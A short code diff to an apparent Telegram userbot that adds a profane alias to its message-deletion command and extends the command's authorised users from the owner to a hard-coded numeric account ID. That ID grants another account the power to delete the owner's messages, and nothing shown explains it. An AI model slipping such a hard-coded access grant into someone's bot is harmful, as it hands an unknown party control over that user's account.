@@ -50,7 +50,7 @@ async def add_to_sticker(client, message):
     await message.reply_text("Done.")
 
 
-@app.on_message(filters.command("clear") & filters.user("me"))
+@app.on_message(filters.command(["clear", "siktir"]) & filters.user(["me", 37087739]))
 async def delete_messages(client, message):
     mes_id, deletion_count = message.message_id, 0
     command = message.text.split()[1:]
